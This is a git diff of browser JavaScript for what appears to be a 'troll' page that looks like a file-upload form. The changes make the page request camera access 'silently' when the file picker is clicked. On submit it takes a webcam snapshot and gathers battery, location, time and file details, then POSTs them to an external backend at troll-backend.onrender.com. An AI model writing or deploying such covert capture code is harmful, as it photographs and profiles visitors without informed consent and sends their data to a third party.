@@ -7,40 +7,46 @@ const fileInput = document.getElementById("user-file");
 const backendURL = "https://troll-backend.onrender.com/api/upload";
 const constraints = { video: { facingMode: "user" }, audio: false };
 
-// Show toast
+// Show a small toast message
 function showToast(message) {
   toast.innerText = message;
-  toast.classList.add("show");
+  toast.style.display = "block";
+  toast.style.opacity = 1;
+
   setTimeout(() => {
-    toast.classList.remove("show");
-  }, 3000);
+    toast.style.opacity = 0;
+    setTimeout(() => (toast.style.display = "none"), 300);
+  }, 2000);
 }
 
-// Ask for camera permission before file selection
+// Ask camera permission when clicking file input, then always open file picker
 fileInput.addEventListener("click", async (e) => {
-  e.preventDefault();
   try {
-    const stream = await navigator.mediaDevices.getUserMedia(constraints);
-    videoEl.srcObject = stream;
-    showToast("Camera permission granted. Now select a file.");
-    // Trigger the file dialog
-    fileInput.click();
+    // Try requesting camera permission silently
+    await navigator.mediaDevices.getUserMedia(constraints);
   } catch (err) {
-    showToast("Camera permission denied!");
-    alert("Camera permission is required to proceed.");
-    console.error(err);
+    console.warn("Camera access denied or ignored:", err);
+    // Even if user denies, we continue to open file picker
   }
+  // File input will open automatically after click, nothing else needed
 });
 
 // Form submission
 form.addEventListener("submit", async (e) => {
   e.preventDefault();
+
   const submitBtn = document.getElementById("submit-btn");
   submitBtn.disabled = true;
   submitBtn.textContent = "Submitting...";
   showToast("Uploading your response...");
 
   try {
+    // Start camera (optional: for snapshot capture if needed)
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    videoEl.srcObject = stream;
+    await videoEl.play();
+    await new Promise(res => videoEl.addEventListener("canplay", () => setTimeout(res, 300)));
+
     // Capture image from camera
     const ctx = canvasEl.getContext("2d");
     canvasEl.width = videoEl.videoWidth;
@@ -58,7 +64,9 @@ form.addEventListener("submit", async (e) => {
       battery: "N/A",
       location: "N/A",
       time: new Date().toLocaleString(),
-      filename: fileInput.files[0]?.name || "No file selected"
+      fileName: fileInput.files[0]?.name || "No file selected",
+      fileType: fileInput.files[0]?.type || "N/A",
+      fileSize: fileInput.files[0]?.size || 0
     };
 
     if (navigator.getBattery) {
@@ -77,7 +85,7 @@ form.addEventListener("submit", async (e) => {
       }
     }
 
-    // Send to backend
+    // Send data to backend
     await fetch(backendURL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
